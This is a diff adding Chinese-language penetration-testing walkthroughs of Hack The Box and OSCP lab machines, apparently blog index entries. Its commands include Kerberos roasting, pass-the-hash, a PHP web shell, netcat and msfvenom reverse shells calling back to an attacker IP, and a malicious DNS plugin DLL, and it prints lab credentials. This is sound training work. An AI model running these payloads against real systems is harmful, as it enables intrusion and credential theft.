@@ -2475,4 +2475,393 @@
         <tag>AD</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Resolute Record</title>
+    <url>/2025/05/05/Active/</url>
+    <content><![CDATA[<h1 id="Active-Walkthrough"><a href="#Active-Walkthrough" class="headerlink" title="Active Walkthrough"></a>Active Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://app.hackthebox.com/machines/148/information">Active</a></p>
+<p>Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.</p>
+<p><img src="/picture/image-20250423180214688.png" alt="image-20250423180214688"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>使用 enum4linux 对 SMB 服务进行枚举</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -a 10.129.65.81</span><br></pre></td></tr></table></figure>
+
+<p>仅发现共享目录</p>
+<p><img src="/picture/image-20250423152238863.png" alt="image-20250423152238863"></p>
+<p>使用 crackmapexec 再次探测 SMB 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.129.65.81 --shares -u &#x27;&#x27; -p &#x27;&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>发现可读共享文件夹 Replication 以及域名 active.htb</p>
+<p><img src="/picture/image-20250423152402436.png" alt="image-20250423152402436"></p>
+<p>使用 smbclient 尝试匿名登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.129.65.81/Replication</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250423152641343.png" alt="image-20250423152641343"></p>
+<p>在 SMB 共享文件夹 \active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups 中发现 Groups.xml</p>
+<p><img src="/picture/image-20250423152755362.png" alt="image-20250423152755362"></p>
+<p>读取 Groups.xml ，发现泄露域用户名称 active.htb\SVC_TGS 和加密后的 cpassword</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Groups</span> <span class="attr">clsid</span>=<span class="string">&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">clsid</span>=<span class="string">&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;active.htb\SVC_TGS&quot;</span> <span class="attr">image</span>=<span class="string">&quot;2&quot;</span> <span class="attr">changed</span>=<span class="string">&quot;2018-07-18 20:46:06&quot;</span> <span class="attr">uid</span>=<span class="string">&quot;&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Properties</span> <span class="attr">action</span>=<span class="string">&quot;U&quot;</span> <span class="attr">newName</span>=<span class="string">&quot;&quot;</span> <span class="attr">fullName</span>=<span class="string">&quot;&quot;</span> <span class="attr">description</span>=<span class="string">&quot;&quot;</span> <span class="attr">cpassword</span>=<span class="string">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span> <span class="attr">changeLogon</span>=<span class="string">&quot;0&quot;</span> <span class="attr">noChange</span>=<span class="string">&quot;1&quot;</span> <span class="attr">neverExpires</span>=<span class="string">&quot;1&quot;</span> <span class="attr">acctDisabled</span>=<span class="string">&quot;0&quot;</span> <span class="attr">userName</span>=<span class="string">&quot;active.htb\SVC_TGS&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">User</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Groups</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 gpp-decrypt 解密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gpp-decrypt &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span><br></pre></td></tr></table></figure>
+
+<p>解密出来的密码为 : GPPstillStandingStrong2k18</p>
+<blockquote>
+<p>原密文应为有效的Base64字符串，长度是4的倍数，解码后必须为16倍数，不符合的话需要适当添加 &#x3D; 补齐</p>
+</blockquote>
+<p><img src="/picture/image-20250423152945893.png" alt="image-20250423152945893"></p>
+<p>使用各种横向移动方式都登陆不上，比如这个 evil-winrm </p>
+<p><img src="/picture/image-20250423155017519.png" alt="image-20250423155017519"></p>
+<p>那就不考虑横向移动，尝试使用 impacket-GetUserSPNs 进行 kerberoasting 攻击获得 TGS</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip 10.129.65.81 -request &quot;active.htb/SVC_TGS&quot;:&quot;GPPstillStandingStrong2k18&quot;</span><br></pre></td></tr></table></figure>
+
+<p>获得了 Administrator 的 TGS </p>
+<p><img src="/picture/image-20250423155135511.png" alt="image-20250423155135511"></p>
+<p>使用 hashcat 使用 13100 模式破解 TGS 票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 administrator_hash -a 0 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>Administrator 密码为 Ticketmaster1968</p>
+<p><img src="/picture/image-20250423155224852.png" alt="image-20250423155224852"></p>
+<p>由于目标主机 SMB 服务又开启了 ADMIN$ 共享</p>
+<p>使用 impacket-psexec 通过 SMB 协议连接到目标主机的 ADMIN$ 共享，上传并执行一个恶意服务，获得交互式 shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec &quot;active.htb/administrator&quot;:&quot;Ticketmaster1968&quot;@10.129.65.81</span><br></pre></td></tr></table></figure>
+
+<p>拿下域控</p>
+<p><img src="/picture/image-20250423160731168.png" alt="image-20250423160731168"></p>
+<p>在 Administrator 桌面获得 root.txt</p>
+<p><img src="/picture/image-20250423175721815.png" alt="image-20250423175721815"></p>
+<p>说实话感觉自己的是非预期做法，结果出去看了看官方的 Waklthrough ，还真是这么做的</p>
+<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250423180021328.png" alt="image-20250423180021328"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>HTB</tag>
+        <tag>AD</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bastard Walkthrough</title>
+    <url>/2025/04/26/Bastard/</url>
+    <content><![CDATA[<h1 id="Bastard-Walkthrough"><a href="#Bastard-Walkthrough" class="headerlink" title="Bastard Walkthrough"></a>Bastard Walkthrough</h1><p>一台不太像 AD 靶机做法的靶机 …</p>
+<h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://app.hackthebox.com/machines/7">Bastard</a></p>
+<p>Bastard is not overly challenging, however it requires some knowledge of PHP in order to modify and use the proof of concept required for initial entry. This machine demonstrates the potential severity of vulnerabilities in content management systems.</p>
+<p><img src="/picture/image-20250425163714704.png" alt="image-20250425163714704"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>使用 nmap 进行端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.129.37.166 --min-rate 2500 </span><br></pre></td></tr></table></figure>
+
+<p>发现 80、135、49154 端口</p>
+<p><img src="/picture/image-20250425145207721.png" alt="image-20250425145207721"></p>
+<p>对开放端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 80,135,49154 -sC -sV 10.129.37.166</span><br></pre></td></tr></table></figure>
+
+<p>发现 80 端口开放 http 服务同时泄露 robots.txt</p>
+<p><img src="/picture/image-20250425145259694.png" alt="image-20250425145259694"></p>
+<p>在 robots.txt 中发现有趣文件 CHANGELOG.txt </p>
+<p><img src="/picture/image-20250425145344040.png" alt="image-20250425145344040"></p>
+<p>CHANGELOG.txt 泄露版本信息：Drupal 7.54</p>
+<p><img src="/picture/image-20250425145431637.png" alt="image-20250425145431637"></p>
+<p>在这可以发现对应版本漏洞： <a href="https://www.exploit-db.com/exploits/41564">https://www.exploit-db.com/exploits/41564</a> </p>
+<p>更改 url、endpoint_path 和核心漏洞利用代码如下：</p>
+<p><img src="/picture/image-20250425155306940.png" alt="image-20250425155306940"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;upload&#x27;</span>]))&#123;                      </span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">            <span class="variable">$_REQUEST</span>[<span class="string">&#x27;upload&#x27;</span>],                         </span><br><span class="line">            <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://10.10.14.18/&quot;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&#x27;upload&#x27;</span>]) </span><br><span class="line">        );</span><br><span class="line">    &#125;                                                    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;                        </span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 php 执行代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php 41564.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>sudo apt install php-curl</p>
+</blockquote>
+<p>上传成功：</p>
+<p><img src="/picture/image-20250425144952449.png" alt="image-20250425144952449"></p>
+<p>能正常执行脚本：</p>
+<p><img src="/picture/image-20250425145032428-1746536050427-1.png" alt="image-20250425145032428"></p>
+<p>上传 nc.exe ，在 kali 中位于 &#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;binaries&#x2F;nc.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload=nc.exe</span><br></pre></td></tr></table></figure>
+
+<p>上传成功</p>
+<p><img src="/picture/image-20250425154700193.png" alt="image-20250425154700193"></p>
+<p>使用 nc.exe 反弹 shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=nc.exe -e cmd 10.10.14.18 4444</span><br></pre></td></tr></table></figure>
+
+<p>成功接收回弹到的 shell</p>
+<p><img src="/picture/image-20250425154602130.png" alt="image-20250425154602130"></p>
+<p>查看系统版本</p>
+<p><img src="/picture/image-20250425155916644.png" alt="image-20250425155916644"></p>
+<p>发现可以利用内核漏洞提权，利用程序网址在这：<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051">windows-kernel-exploits&#x2F;MS15-051 at master · SecWiki&#x2F;windows-kernel-exploits</a></p>
+<p><img src="/picture/image-20250425162710045.png" alt="image-20250425162710045"></p>
+<p>上传漏洞利用程序：ms15-051x64.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload=ms15-051x64.exe</span><br></pre></td></tr></table></figure>
+
+<p>成功上传</p>
+<p><img src="/picture/image-20250425163241912.png" alt="image-20250425163241912"></p>
+<p>在目标主机执行漏洞利用程序，获得 SYSTEM 账户权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ms15-051x64.exe whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250425162954915.png" alt="image-20250425162954915"></p>
+<p>使用 msfvenom 制作反弹 shell 程序并上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=8888 -f exe -o root.exe</span><br><span class="line">upload=root.exe</span><br></pre></td></tr></table></figure>
+
+<p>上传成功：</p>
+<p><img src="/picture/image-20250425163132236.png" alt="image-20250425163132236"></p>
+<p>使用漏洞利用程序执行反弹 shell 程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ms15-051x64.exe root.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250425162836444.png" alt="image-20250425162836444"></p>
+<p>本机开启 nc 监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 8888</span><br></pre></td></tr></table></figure>
+
+<p>获得目标主机 SYSTEM 权限的 shell</p>
+<p><img src="/picture/image-20250425162904759.png" alt="image-20250425162904759"></p>
+<p>在 Administrator 桌面获得 root.txt</p>
+<p><img src="/picture/image-20250425162421416.png" alt="image-20250425162421416"></p>
+<p>在用户 dimitris 桌面获得 user.txt</p>
+<p><img src="/picture/image-20250425162623914.png" alt="image-20250425162623914"></p>
+<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250425163519589.png" alt="image-20250425163519589"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>HTB</tag>
+        <tag>AD</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Resolute Record</title>
+    <url>/2025/05/06/Secura01/</url>
+    <content><![CDATA[<h1 id="Secura01"><a href="#Secura01" class="headerlink" title="Secura01"></a>Secura01</h1><p>使用 enum4linux 对目标主机进行默认用户名密码检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -a 192.168.152.95</span><br></pre></td></tr></table></figure>
+
+<p>不允许默认用户名密码</p>
+<p><img src="/picture/image-20250503150753222.png" alt="image-20250503150753222"></p>
+<p>使用 nxc 查看 Eric.Wallows 是否在目标主机 smb 服务拥有权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc smb 192.168.152.95 --shares -u Eric.Wallows -p EricLikesRunning800</span><br></pre></td></tr></table></figure>
+
+<p>显示 Pwn3d 说明当前使用的账户 Eric.Wallows 通过 SMB 协议对目标主机 192.168.152.95 具有 <strong>系统级权限</strong></p>
+<p>无需进一步提权，即可直接执行任意命令、访问敏感文件或控制系统</p>
+<p><img src="/picture/image-20250503155440036.png" alt="image-20250503155440036"></p>
+<p>使用 impacket-secretsdump 提取本地 SAM 哈希和域凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump &#x27;secura.yzx/Eric.Wallows:EricLikesRunning800@192.168.152.95&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>回显 Administrator 密码哈希</p>
+<p><img src="/picture/image-20250503154236536.png" alt="image-20250503154236536"></p>
+<p>使用 impacket-psexec 进行 PtH 攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a51493b0b06e5e35f855245e71af1d14 administrator@192.168.102.95</span><br><span class="line">evil-winrm -i 192.168.102.95 -u administrator -H &quot;a51493b0b06e5e35f855245e71af1d14&quot;</span><br></pre></td></tr></table></figure>
+
+<p>获得 .95 目标主机的 SYSTEM 账户</p>
+<p><img src="/picture/image-20250503155921519.png" alt="image-20250503155921519"></p>
+<p>在 Administrator 的桌面发现 proof.txt</p>
+<p><img src="/picture/image-20250503160812848.png" alt="image-20250503160812848"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>AD</tag>
+        <tag>OSCP Challenge Lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Resolute Record</title>
+    <url>/2025/04/24/Resolute/</url>
+    <content><![CDATA[<h1 id="Resolute-Record"><a href="#Resolute-Record" class="headerlink" title="Resolute Record"></a>Resolute Record</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://app.hackthebox.com/machines/220">Resolute</a></p>
+<p>Resolute is an easy difficulty Windows machine that features Active Directory. The Active Directory anonymous bind is used to obtain a password that the sysadmins set for new user accounts, although it seems that the password for that account has since changed. A password spray reveals that this password is still in use for another domain user account, which gives us access to the system over WinRM. A PowerShell transcript log is discovered, which has captured credentials passed on the command-line. This is used to move laterally to a user that is a member of the DnsAdmins group. This group has the ability to specify that the DNS Server service loads a plugin DLL. After restarting the DNS service, we achieve command execution on the domain controller in the context of <code>NT_AUTHORITY\SYSTEM</code>.</p>
+<p><img src="/picture/image-20250424210723202.png" alt="image-20250424210723202"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>使用 nmap 扫描目标主机端口即应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sC -sV 10.129.96.155 --min-rate 2500</span><br></pre></td></tr></table></figure>
+
+<p>发现泄露域名 megabank.local 以及全限定域名 Resolute.megabank.local</p>
+<p><img src="/picture/image-20250424144251568.png" alt="image-20250424144251568"></p>
+<p>将目标 IP 和全限定域名绑定说不定有用</p>
+<p><img src="/picture/image-20250424144323933.png" alt="image-20250424144323933"></p>
+<p>使用 smbclient 枚举共享目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N -L //10.129.96.155</span><br></pre></td></tr></table></figure>
+
+<p>看来没有给匿名用户设置文件共享</p>
+<p><img src="/picture/image-20250424144605971.png" alt="image-20250424144605971"></p>
+<p>使用 enum4linux 对目标主机 SMB 服务枚举</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -a 10.129.96.155</span><br></pre></td></tr></table></figure>
+
+<p>在 Users 栏目发现泄露账户密码 marko &#x2F; Welcome123!</p>
+<p><img src="/picture/image-20250424144655034.png" alt="image-20250424144655034"></p>
+<p>使用 crackmapexec 查看 marko 的密码是否真的是 Welcome123!</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.129.96.155 -u &#x27;marko&#x27; -p &#x27;Welcome123!&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>看来不是</p>
+<p><img src="/picture/image-20250424145915017.png" alt="image-20250424145915017"></p>
+<p>查看目标主机密码策略</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.129.96.155 --pass-pol -u &#x27;&#x27; -p &#x27;&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>发现目标主机的没有账户锁定，可以进行密码爆破</p>
+<p><img src="/picture/image-20250424152125501.png" alt="image-20250424152125501"></p>
+<p>由于 Welcome123! 是默认密码，将 Users 制作成密码字典，使用密码喷洒看看有没有其他用户也是默认密码</p>
+<p><img src="/picture/image-20250424145513060.png" alt="image-20250424145513060"></p>
+<p>使用 crackmapexec 进行 SMB 服务密码喷洒</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.129.96.155 -u username.txt -p &#x27;Welcome123!&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>没 <strong>Pwn3d!</strong> 标志，说明需寻找其他途径提升权限</p>
+<p><img src="/picture/image-20250424145802912.png" alt="image-20250424145802912"></p>
+<p>尝试下最常用的 winrm 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec winrm 10.129.96.155 -u username.txt -p &#x27;Welcome123!&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>有 <strong>Pwn3d!</strong> 标志，可直接控制目标，进入渗透下一阶段</p>
+<p><img src="/picture/image-20250424184201192.png" alt="image-20250424184201192"></p>
+<p>使用 evil-winrm 借助 winrm 进行横向移动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u &#x27;megabank.local\melanie&#x27; -p &#x27;Welcome123!&#x27; -i 10.129.96.155</span><br></pre></td></tr></table></figure>
+
+<p>获得 melanie 域用户的 powershell ，并在其桌面获得 user.txt</p>
+<p><img src="/picture/image-20250424150501555.png" alt="image-20250424150501555"></p>
+<p>在根目录发现疑似 powershell 命令历史文件夹，且是隐藏的</p>
+<p><img src="/picture/image-20250424191030900.png" alt="image-20250424191030900"></p>
+<p>发现 powershell 命令历史文件</p>
+<p><img src="/picture/image-20250424192016269.png" alt="image-20250424192016269"></p>
+<p>泄露了 ryan 用户的密码：Serv3r4Admin4cc123!</p>
+<p><img src="/picture/image-20250424192242503.png" alt="image-20250424192242503"></p>
+<p>看看 ryan 有什么权限</p>
+<p><img src="/picture/image-20250424192457237.png" alt="image-20250424192457237"></p>
+<p>使用 crackmapexec 看看 ryan 能否访问 ADMIN$ 等目录，看起来不行，就不能使用 impacket-psexec 执行命令</p>
+<p><img src="/picture/image-20250424193159640.png" alt="image-20250424193159640"></p>
+<p>那就使用 evil-winrm 横向移动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u &#x27;megabank.local\ryan&#x27; -p &#x27;Serv3r4Admin4cc123!&#x27; -i 10.129.96.155</span><br></pre></td></tr></table></figure>
+
+<p>获得 ryan 的 powershell</p>
+<p><img src="/picture/image-20250424195430809.png" alt="image-20250424195430809"></p>
+<p>发现 ryan 属于 DnsAdmin 用户组</p>
+<p><img src="/picture/image-20250424195328187.png" alt="image-20250424195328187"></p>
+<p>我们可以通过 ryan 帐户使用外部 DLL 插件文件执行 dnscmd.exe 命令来进行权限提升</p>
+<p>什么方式都失败了，感觉是因为靶机没 60s 重置一次太搞了，就记录下攻击方法吧 …</p>
+<blockquote>
+<p>【1】</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&#x27;net user administrator P@s5w0rd123! /domain&#x27; -f dll &gt; add.dll</span><br><span class="line">impacket-smbserver share ./</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.18\share\add.dll</span><br><span class="line">   sc.exe stop dns</span><br><span class="line">   sc.exe start dns</span><br></pre></td></tr></table></figure>
+   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;impacket-psexec &#x27;megabank.local/administrator&#x27;:&#x27;P@s5w0rd123!&#x27;@10.129.96.155</span><br></pre></td></tr></table></figure>
+
+<p>   【2】</p>
+   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 --platform=windows -f dll &gt; shell.dll</span><br><span class="line">impacket-smbserver share ./</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.18\share\shell.dll</span><br><span class="line">sc.exe stop dns</span><br><span class="line">&gt;sc.exe start dns</span><br></pre></td></tr></table></figure>
+
+   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>HTB</tag>
+        <tag>AD</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Resolute Record</title>
+    <url>/2025/04/28/Sauna/</url>
+    <content><![CDATA[<h1 id="Sauna-Walkthrough"><a href="#Sauna-Walkthrough" class="headerlink" title="Sauna Walkthrough"></a>Sauna Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://app.hackthebox.com/machines/Sauna">Sauna</a></p>
+<p>Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn&amp;amp;#039;t require Kerberos pre-authentication. This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the <em>DS-Replication-Get-Changes-All</em> extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket&amp;amp;#039;s psexec.py in order to gain a shell on the box as <code>NT_AUTHORITY\SYSTEM</code>.</p>
+<p><img src="/picture/image-20250423132154309.png" alt="image-20250423132154309"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>nmap 对目标主机就行端口发现</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.129.223.5 --min-rate 5000</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250423120111160.png" alt="image-20250423120111160"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.129.223.5</span><br></pre></td></tr></table></figure>
+
+<p>并没有泄露域名，目标主机开放 LDAP 服务</p>
+<p><img src="/picture/image-20250423120739468.png" alt="image-20250423120739468"></p>
+<p>使用 enum4linux 对 SMB 服务进行侦察</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -a 10.129.223.5</span><br></pre></td></tr></table></figure>
+
+<p>可以使用空用户名和密码对，同时泄露了不完整的域名</p>
+<p><img src="/picture/image-20250422191659169.png" alt="image-20250422191659169"></p>
+<p>使用 crackmapexec 对 SMB 服务枚举</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.129.223.5 --shares -u &#x27;&#x27; -p &#x27;&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>泄露完整域名 : <code>egotistical-bank.local</code></p>
+<p><img src="/picture/image-20250422191828385.png" alt="image-20250422191828385"></p>
+<p>访问 80 页面，在 about.html 发现泄露员工名称</p>
+<p><img src="/picture/image-20250422192506024.png" alt="image-20250422192506024"></p>
+<p>使用 username-anarchy 生成用户名密码字典</p>
+<blockquote>
+<p>以 Hugo Bear 为例，first,last,flast,firstl,first.last 分别是 hugo, bear, hbearhugob, hugo.bear</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./username-anarchy --input-file ../users.txt --select-format first,last,flast,firstl,first.last &gt; ../usernames.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250422201101988.png" alt="image-20250422201101988"></p>
+<p>编写脚本，猜测用户名仅作为用户账户，使用 GetNPUsers  循环使用用户名进行 nopass 尝试登陆，</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> file; <span class="keyword">do</span> impacket-GetNPUsers -dc-ip 10.129.223.5 -no-pass -request egotistical-bank.local/<span class="string">&quot;<span class="variable">$file</span>&quot;</span> 2&gt;/dev/null &gt;&gt; hash.txt; <span class="keyword">done</span> &lt; usernames.txt</span><br></pre></td></tr></table></figure>
+
+<p>获得 fsmith 账号和 TGT 哈希，可以尝试 AS-REP Roasting</p>
+<p><img src="/picture/image-20250422201019699.png" alt="image-20250422201019699"></p>
+<p>使用 hashcat 18200 模式 AS-REP 破解密码哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash -a 0 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250423124737439.png" alt="image-20250423124737439"></p>
+<p>爆破出密码 Thestrokes23</p>
+<p><img src="/picture/image-20250422201447475.png" alt="image-20250422201447475"></p>
+<p>由于目标主机开放 WinRM 服务，借此进行横向移动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u fsmith -p Thestrokes23 -i 10.129.223.5</span><br></pre></td></tr></table></figure>
+
+<p>获得 fsmith 的 shell</p>
+<p><img src="/picture/image-20250422202914257.png" alt="image-20250422202914257"></p>
+<p>在 fsmith 的 Desktop 目录获得 user.txt</p>
+<p><img src="/picture/image-20250422203013643.png" alt="image-20250422203013643"></p>
+<p>上传并执行 winPEAS</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.13/winPEASany.exe -O winPEASany.exe</span><br><span class="line">.\winPEAS</span><br></pre></td></tr></table></figure>
+
+<p>泄露 AutoLogon 账户密码：svc_loanmanager&#x2F;Moneymakestheworldgoround!</p>
+<p><img src="/picture/image-20250422204004089.png" alt="image-20250422204004089"></p>
+<p>在 Users 中查询到登录名为 svc_loanmgr</p>
+<p><img src="/picture/image-20250422210101619.png" alt="image-20250422210101619"></p>
+<p>再次借助 WinRM 横向移动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u svc_loanmgr -p &#x27;Moneymakestheworldgoround!&#x27; -i 10.129.223.5</span><br></pre></td></tr></table></figure>
+
+<p>获得 svc_loanmgr 的 shell</p>
+<p><img src="/picture/image-20250422210423741.png" alt="image-20250422210423741"></p>
